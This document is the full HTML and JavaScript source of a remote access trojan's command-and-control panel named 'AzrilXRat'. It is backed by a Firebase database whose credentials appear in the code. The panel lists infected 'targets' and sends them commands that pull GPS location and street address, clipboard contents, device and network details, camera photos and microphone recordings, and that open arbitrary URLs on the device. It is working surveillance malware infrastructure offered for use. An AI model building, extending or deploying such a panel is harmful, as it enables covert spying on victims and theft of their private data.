<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AzrilXRat | C2 Panel</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script>tailwind.config={theme:{extend:{fontFamily:{mono:['Ubuntu Mono','monospace'],sans:['Space Grotesk','system-ui','sans-serif']}}}}</script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
::-webkit-scrollbar{display:none}
body{font-family:'Space Grotesk',sans-serif;background:#181818;color:#e5e7eb;letter-spacing:.02em;min-height:100vh}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
.z1{position:relative;z-index:1}
#nav{position:fixed;top:0;left:0;right:0;z-index:50;background:#181818;border-bottom:1px solid #272727;transition:background .3s}
#nav.blur{background:rgba(24,24,24,.85);backdrop-filter:blur(16px)}
.nav-inner{max-width:1300px;margin:0 auto;padding:16px 28px;display:flex;align-items:center;justify-content:space-between}
.nav-brand{display:flex;align-items:center;gap:10px}
.nav-logo{font-weight:700;font-size:15px;color:#fff}
.nav-badge{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#484848;background:#111;padding:3px 10px;border-radius:999px;border:1px solid #252525}
.status-pill{display:flex;align-items:center;gap:7px;font-family:'Ubuntu Mono',monospace;font-size:10px;color:#555;letter-spacing:.08em;text-transform:uppercase;border:1px solid #272727;background:#181818;padding:5px 13px;border-radius:999px}
.dot{width:5px;height:5px;border-radius:50%;background:#4ade80;animation:pulse 2s ease-in-out infinite}
.dot.off{background:#f87171;animation:none}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.15}}
.wrap{max-width:1300px;margin:0 auto;padding:80px 20px 40px}
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
.stat-card{background:#0f0f0f;border:1px solid #252525;border-radius:14px;padding:16px 18px}
.stat-label{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#404040;letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px}
.stat-val{font-size:20px;font-weight:600;color:#fff}
.main-grid{display:grid;grid-template-columns:240px 1fr;gap:10px}
.sidebar{background:#0f0f0f;border:1px solid #252525;border-radius:16px;overflow:hidden;max-height:70vh}
.side-hd{padding:16px 18px;border-bottom:1px solid #1c1c1c;font-family:'Ubuntu Mono',monospace;font-size:9.5px;color:#555;letter-spacing:.08em;text-transform:uppercase;display:flex;align-items:center;justify-content:space-between}
.side-count{font-family:'Ubuntu Mono',monospace;font-size:10px;color:#4ade80;background:rgba(74,222,128,.06);padding:2px 10px;border-radius:999px}
.side-list{overflow-y:auto;max-height:60vh}
.side-item{padding:12px 18px;border-bottom:1px solid #131313;cursor:pointer;transition:all .16s;display:flex;align-items:center;gap:10px}
.side-item:hover{background:#141414}
.side-item.sel{background:#111;border-left:2px solid #4ade80}
.side-dot{width:6px;height:6px;border-radius:50%;background:#4ade80;flex-shrink:0}
.side-dot.off{background:#2a2a2a}
.side-name{font-size:11px;color:#ccc;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.side-model{font-family:'Ubuntu Mono',monospace;font-size:8px;color:#444}
.control{background:#0f0f0f;border:1px solid #252525;border-radius:16px;overflow:hidden}
.ctrl-hd{padding:16px 20px;border-bottom:1px solid #1c1c1c;display:flex;align-items:center;justify-content:space-between}
.ctrl-title{font-size:12px;font-weight:500;color:#aaa}
.ctrl-id{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#444;background:#111;padding:4px 12px;border-radius:999px}
.action-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;padding:16px}
.action-card{border:1px solid #1d1d1d;border-radius:12px;padding:14px;cursor:pointer;transition:all .18s;background:#111;text-align:center}
.action-card:hover{border-color:#333;background:#161616}
.action-card.flash{border-color:#4ade80;background:#0a1a0a;animation:flashIn .5s ease-out}
@keyframes flashIn{0%{opacity:.4;transform:scale(.96)}100%{opacity:1;transform:scale(1)}}
.action-icon{font-size:22px;display:block;margin-bottom:6px}
.action-label{font-size:10px;font-weight:500;color:#999}
.card-input{background:#080808;border:1px solid #181818;color:#bbb;padding:5px 8px;border-radius:5px;font-size:9px;width:100%;margin-top:6px;font-family:'Ubuntu Mono',monospace}
.card-btn{background:#151515;border:1px solid #222;color:#888;padding:4px 10px;border-radius:5px;font-size:9px;margin-top:5px;cursor:pointer;width:100%;transition:all .15s}
.card-btn:hover{background:#1e1e1e;color:#fff}
.console-wrap{border-top:1px solid #1c1c1c;padding:16px 20px}
.console-hd{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#363636;letter-spacing:.09em;text-transform:uppercase;margin-bottom:9px}
.console-box{background:#060606;border:1px solid #1a1a1a;border-radius:9px;padding:12px;height:160px;overflow-y:auto;font-family:'Ubuntu Mono',monospace;font-size:9.5px;line-height:1.7;color:#555}
.console-box .lgr{color:#4ade80}.console-box .lgs{color:#facc15}.console-box .lge{color:#f87171}.console-box .lgb{color:#60a5fa}

.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);z-index:100;display:flex;align-items:center;justify-content:center;padding:20px}
.modal-box{background:#111;border:1px solid #282828;border-radius:18px;padding:0;min-width:450px;max-width:94vw;max-height:85vh;overflow:hidden;animation:modalIn .3s ease-out}
@keyframes modalIn{0%{opacity:0;transform:scale(.92)}100%{opacity:1;transform:scale(1)}}
.modal-header{background:#0a0a0a;border-bottom:1px solid #1c1c1c;padding:16px 20px;display:flex;align-items:center;gap:12px}
.modal-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:17px}
.modal-icon.gps{background:rgba(74,222,128,.12);color:#4ade80}
.modal-icon.globe{background:rgba(96,165,250,.12);color:#60a5fa}
.modal-icon.clip{background:rgba(192,132,252,.12);color:#c084fc}
.modal-icon.device{background:rgba(251,146,60,.12);color:#fb923c}
.modal-icon.battery{background:rgba(250,204,21,.12);color:#facc15}
.modal-icon.camera{background:rgba(244,114,182,.12);color:#f472b6}
.modal-icon.mic{background:rgba(239,68,68,.12);color:#ef4444}
.modal-icon.default{background:rgba(148,163,184,.12);color:#94a3b8}
.modal-title-text{font-size:14px;font-weight:600;color:#fff}
.modal-subtitle{font-size:9px;color:#555;font-family:'Ubuntu Mono',monospace}
.modal-body{padding:18px 20px;max-height:50vh;overflow-y:auto}
.data-row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid #151515}
.data-row:last-child{border-bottom:none}
.data-label{font-size:10px;color:#555;font-family:'Ubuntu Mono',monospace;text-transform:uppercase;letter-spacing:.06em}
.data-value{font-size:11px;color:#ddd;font-weight:500;text-align:right;max-width:60%;word-break:break-all}
.data-value.link{color:#60a5fa;cursor:pointer}
.data-value.link:hover{text-decoration:underline}
.modal-footer{border-top:1px solid #1c1c1c;padding:14px 20px;display:flex;gap:8px}
.modal-btn{flex:1;padding:10px;border-radius:8px;font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:500;cursor:pointer;transition:all .16s}
.modal-btn.close{background:transparent;border:1px solid #282828;color:#888}
.modal-btn.close:hover{background:#1a1a1a;color:#fff}
.modal-btn.copy{background:#1a1a1a;border:1px solid #333;color:#aaa}
.modal-btn.copy:hover{background:#222;color:#fff}
.map-link{display:block;background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.2);border-radius:8px;padding:10px;color:#60a5fa;text-align:center;font-size:11px;cursor:pointer;margin-top:8px;transition:all .16s}
.map-link:hover{background:rgba(96,165,250,.15)}
.preview-img{width:100%;border-radius:8px;margin-top:8px}
.preview-audio{width:100%;margin-top:8px}
.toast{position:fixed;bottom:24px;right:24px;z-index:200;background:#0f0f0f;border:1px solid #4ade80;color:#4ade80;font-family:'Ubuntu Mono',monospace;font-size:10px;padding:10px 18px;border-radius:999px;opacity:0;transform:translateY(10px);transition:all .35s;pointer-events:none}
.toast.show{opacity:1;transform:translateY(0)}
.toast.err{border-color:#f87171;color:#f87171}
@media(max-width:800px){.main-grid{grid-template-columns:1fr}.sidebar{max-height:180px}.action-grid{grid-template-columns:1fr 1fr}.modal-box{min-width:auto}}
</style>
</head>
<body>

<nav id="nav" class="z1"><div class="nav-inner"><div class="nav-brand"><span class="nav-logo"><i class="fas fa-skull"></i> AzrilXRat</span><span class="nav-badge">C2 PANEL</span></div><div class="status-pill"><span class="dot" id="statusDot"></span><span id="statusText">INIT...</span></div></div></nav>

<div class="wrap z1">
  <div class="stats-grid">
    <div class="stat-card"><p class="stat-label"><i class="fas fa-circle-nodes"></i> Online</p><p class="stat-val" id="stOnline">0</p></div>
    <div class="stat-card"><p class="stat-label"><i class="fas fa-terminal"></i> Commands</p><p class="stat-val" id="stCmds">0</p></div>
    <div class="stat-card"><p class="stat-label"><i class="fas fa-database"></i> Data</p><p class="stat-val" id="stData">0 KB</p></div>
    <div class="stat-card"><p class="stat-label"><i class="fas fa-clock"></i> Uptime</p><p class="stat-val" id="stUptime">00:00</p></div>
  </div>

  <div class="main-grid">
    <div class="sidebar"><div class="side-hd"><span><i class="fas fa-laptop-code"></i> Targets</span><span class="side-count" id="sideCount">0</span></div><div class="side-list" id="sideList"><div class="side-item" style="color:#444;justify-content:center;padding:24px">Waiting...</div></div></div>

    <div class="control">
      <div class="ctrl-hd"><span class="ctrl-title"><i class="fas fa-bolt"></i> Command Center</span><span class="ctrl-id" id="ctrlDevId">Select device</span></div>
      <div class="action-grid">
        <div class="action-card" onclick="sendCmd('GET_GPS')"><span class="action-icon" style="color:#4ade80"><i class="fas fa-location-crosshairs"></i></span><p class="action-label">GPS + Address</p></div>
        <div class="action-card" onclick="sendCmd('GET_IP_GEO')"><span class="action-icon" style="color:#60a5fa"><i class="fas fa-globe"></i></span><p class="action-label">IP Geolocation</p></div>
        <div class="action-card" onclick="sendCmd('GET_CLIPBOARD')"><span class="action-icon" style="color:#c084fc"><i class="fas fa-copy"></i></span><p class="action-label">Clipboard</p></div>
        <div class="action-card" onclick="sendCmd('GET_DEVICE_INFO')"><span class="action-icon" style="color:#fb923c"><i class="fas fa-mobile-screen"></i></span><p class="action-label">Device Info</p></div>
        <div class="action-card" onclick="sendCmd('GET_BATTERY')"><span class="action-icon" style="color:#facc15"><i class="fas fa-battery-full"></i></span><p class="action-label">Battery</p></div>
        <div class="action-card" onclick="sendCmd('GET_NETWORK')"><span class="action-icon" style="color:#f472b6"><i class="fas fa-wifi"></i></span><p class="action-label">Network</p></div>
        <div class="action-card" onclick="sendCmd('GET_IP')"><span class="action-icon" style="color:#94a3b8"><i class="fas fa-server"></i></span><p class="action-label">IP Only</p></div>
        <div class="action-card" onclick="sendCmd('CAMERA')"><span class="action-icon" style="color:#ef4444"><i class="fas fa-camera"></i></span><p class="action-label">Camera</p></div>
        <div class="action-card" onclick="sendCmd('MIC')"><span class="action-icon" style="color:#ec4899"><i class="fas fa-microphone"></i></span><p class="action-label">Microphone</p></div>
        <div class="action-card" onclick="sendCmd('VIBRATE')"><span class="action-icon" style="color:#a78bfa"><i class="fas fa-wave-square"></i></span><p class="action-label">Vibrate</p></div>
        <div class="action-card"><span class="action-icon" style="color:#38bdf8"><i class="fas fa-arrow-up-right-from-square"></i></span><p class="action-label">Open URL</p><input class="card-input" id="urlIn" placeholder="https://..." onclick="event.stopPropagation()"><button class="card-btn" onclick="event.stopPropagation();sendCmd('OPEN_URL:'+document.getElementById('urlIn').value)">SEND</button></div>
        <div class="action-card"><span class="action-icon" style="color:#fbbf24"><i class="fas fa-triangle-exclamation"></i></span><p class="action-label">Alert</p><input class="card-input" id="alertIn" placeholder="Message..." onclick="event.stopPropagation()"><button class="card-btn" onclick="event.stopPropagation();sendCmd('ALERT:'+document.getElementById('alertIn').value)">SEND</button></div>
      </div>
      <div class="console-wrap"><div class="console-hd"><i class="fas fa-code"></i> Console</div><div class="console-box" id="consoleBox"><span style="color:#363636">[System] Panel Ready</span></div></div>
    </div>
  </div>
</div>

<div class="modal-overlay" id="modalOverlay" style="display:none" onclick="closeModal()">
  <div class="modal-box" onclick="event.stopPropagation()">
    <div class="modal-header"><div class="modal-icon default" id="modalIcon"><i class="fas fa-info-circle"></i></div><div><div class="modal-title-text" id="modalTitle">Result</div><div class="modal-subtitle" id="modalSubtitle"></div></div></div>
    <div class="modal-body" id="modalBody"></div>
    <div class="modal-footer"><button class="modal-btn copy" onclick="copyResult()"><i class="fas fa-copy"></i> Copy JSON</button><button class="modal-btn close" onclick="closeModal()"><i class="fas fa-xmark"></i> Close</button></div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
firebase.initializeApp(FB);
const db=firebase.database(),devicesRef=db.ref('devices'),commandsRef=db.ref('commands'),dataRef=db.ref('collected_data');
let selectedDevice=null,devices={},cmdCount=0,dataSize=0,startTime=Date.now(),lastResult=null;

setInterval(()=>{const e=Math.floor((Date.now()-startTime)/1000);document.getElementById('stUptime').textContent=Math.floor(e/60).toString().padStart(2,'0')+':'+(e%60).toString().padStart(2,'0')},1000);
db.ref('.info/connected').on('value',snap=>{const d=document.getElementById('statusDot'),t=document.getElementById('statusText');if(snap.val()){d.classList.remove('off');t.textContent='CONNECTED'}else{d.classList.add('off');t.textContent='DISCONNECTED'}});
window.addEventListener('scroll',()=>document.getElementById('nav').classList.toggle('blur',scrollY>30),{passive:true});

let toastTimer;
function showToast(m,e=false){clearTimeout(toastTimer);const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' err':'')+' show';toastTimer=setTimeout(()=>t.classList.remove('show'),2200)}

devicesRef.on('child_added',snap=>{const d=snap.val();d.id=snap.key;devices[snap.key]=d;renderDeviceList();log('[+] '+snap.key.substring(0,10),'lgr')});
devicesRef.on('child_changed',snap=>{devices[snap.key]={...devices[snap.key],...snap.val()};renderDeviceList()});
devicesRef.on('child_removed',snap=>{delete devices[snap.key];if(selectedDevice===snap.key){selectedDevice=null;document.getElementById('ctrlDevId').textContent='Select'}renderDeviceList();log('[-] '+snap.key.substring(0,10),'lge')});

dataRef.on('child_added',snap=>{const r=snap.val();if(!r)return;cmdCount++;dataSize+=JSON.stringify(r).length;document.getElementById('stCmds').textContent=cmdCount;document.getElementById('stData').textContent=(dataSize/1024).toFixed(1)+' KB';log('[←] '+r.type,'lgb');lastResult=r;showResultModal(r);snap.ref.remove()});

function renderDeviceList(){const ids=Object.keys(devices);document.getElementById('stOnline').textContent=ids.length;document.getElementById('sideCount').textContent=ids.length;if(!ids.length){document.getElementById('sideList').innerHTML='<div class="side-item" style="color:#444;justify-content:center;padding:24px">Waiting...</div>';return}document.getElementById('sideList').innerHTML=ids.map(id=>{const d=devices[id],sel=selectedDevice===id?' sel':'',off=(Date.now()-d.lastSeen)>30000;return`<div class="side-item${sel}" onclick="selectDevice('${id}')"><span class="side-dot${off?' off':''}"></span><span class="side-name">${id.substring(0,9)}...</span><span class="side-model">${d.model||'?'}</span></div>`}).join('')}
function selectDevice(id){selectedDevice=id;document.getElementById('ctrlDevId').textContent=id.substring(0,18)+'...';renderDeviceList();log('[>] '+id.substring(0,9),'lgs')}
function sendCmd(cmd){if(!selectedDevice){showToast('Select device!',true);return}commandsRef.child(selectedDevice).push({command:cmd,timestamp:Date.now(),status:'pending'});log('[→] '+cmd,'lgs');showToast('Sent: '+cmd);document.querySelectorAll('.action-card').forEach(c=>{c.classList.add('flash');setTimeout(()=>c.classList.remove('flash'),400)})}
function log(m,c=''){const t=new Date().toLocaleTimeString(),b=document.getElementById('consoleBox');b.innerHTML+=`<br><span class="${c}">[${t}] ${m}</span>`;b.scrollTop=b.scrollHeight}

function showResultModal(r){
  const typeMap={GET_GPS:'gps',GET_IP_GEO:'globe',GET_CLIPBOARD:'clip',GET_DEVICE_INFO:'device',GET_BATTERY:'battery',GET_NETWORK:'network',CAMERA:'camera',MIC:'mic',VIBRATE:'default'};
  const iconMap={gps:'<i class="fas fa-location-crosshairs"></i>',globe:'<i class="fas fa-globe"></i>',clip:'<i class="fas fa-copy"></i>',device:'<i class="fas fa-mobile-screen"></i>',battery:'<i class="fas fa-battery-full"></i>',network:'<i class="fas fa-wifi"></i>',camera:'<i class="fas fa-camera"></i>',mic:'<i class="fas fa-microphone"></i>',default:'<i class="fas fa-info-circle"></i>'};
  const ic=typeMap[r.type]||'default';
  document.getElementById('modalIcon').className='modal-icon '+ic;
  document.getElementById('modalIcon').innerHTML=iconMap[ic];
  document.getElementById('modalTitle').textContent=r.type.replace(/_/g,' ');
  document.getElementById('modalSubtitle').textContent=new Date(r.timestamp).toLocaleString();
  
  const d=r.data||r;let h='';
  if(d.error){h=`<div style="color:#f87171;padding:10px;background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px"><i class="fas fa-circle-exclamation"></i> ${d.error}</div>`}
  else{
    for(const[k,v]of Object.entries(d)){
      if(k==='photoUrl'){h+=`<div class="data-row"><span class="data-label">Photo</span></div><img src="${v}" class="preview-img" onclick="window.open('${v}')">`;continue}
      if(k==='audioUrl'){h+=`<div class="data-row"><span class="data-label">Audio</span></div><audio controls class="preview-audio" src="${v}"></audio>`;continue}
      if(k==='maps'||k.includes('maps')){h+=`<div class="data-row"><span class="data-label">${k}</span><span class="data-value link" onclick="window.open('${v}')">Open Map <i class="fas fa-external-link-alt"></i></span></div>`;continue}
      if(k==='address'){h+=`<div class="data-row"><span class="data-label">Address</span><span class="data-value">${v}</span></div>`;continue}
      h+=`<div class="data-row"><span class="data-label">${k}</span><span class="data-value">${v}</span></div>`;
    }
    if(d.maps){h+=`<div class="map-link" onclick="window.open('${d.maps}')"><i class="fas fa-map-marker-alt"></i> Open in Google Maps</div>`}
    if(d.photoUrl){h+=`<div class="map-link" onclick="window.open('${d.photoUrl}')"><i class="fas fa-download"></i> Download Photo</div>`}
    if(d.audioUrl){h+=`<div class="map-link" onclick="window.open('${d.audioUrl}')"><i class="fas fa-download"></i> Download Audio</div>`}
  }
  document.getElementById('modalBody').innerHTML=h||'<div style="color:#555">No data</div>';
  document.getElementById('modalOverlay').style.display='flex';
}

function closeModal(){document.getElementById('modalOverlay').style.display='none'}
function copyResult(){if(lastResult){navigator.clipboard.writeText(JSON.stringify(lastResult,null,2));showToast('Copied!')}}
setInterval(()=>{Object.keys(devices).forEach(id=>{if((Date.now()-devices[id].lastSeen)>600000)devicesRef.child(id).remove()})},60000);
log('Ready');
</script>
</body>
</html>
